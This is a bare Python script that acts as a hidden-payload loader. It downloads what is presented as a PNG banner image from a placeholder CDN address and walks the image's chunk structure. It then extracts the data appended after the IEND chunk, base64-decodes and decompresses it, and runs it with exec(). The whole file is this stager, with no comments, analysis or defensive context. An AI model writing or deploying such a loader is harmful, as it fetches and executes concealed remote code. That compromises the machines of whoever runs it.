from urllib.request import urlopen
import base64
import struct
import zlib

STAGE = "https://cdn.invalid/assets/banner.png?rev=4"
blob = urlopen(STAGE).read()
offset = 8
while offset < len(blob):
    length = struct.unpack(">I", blob[offset:offset + 4])[0]
    kind = blob[offset + 4:offset + 8]
    if kind == b"IDAT":
        pass
    if kind == b"IEND":
        tail = blob[offset + length + 12:]
        break
    offset += length + 12
exec(zlib.decompress(base64.b64decode(tail)))
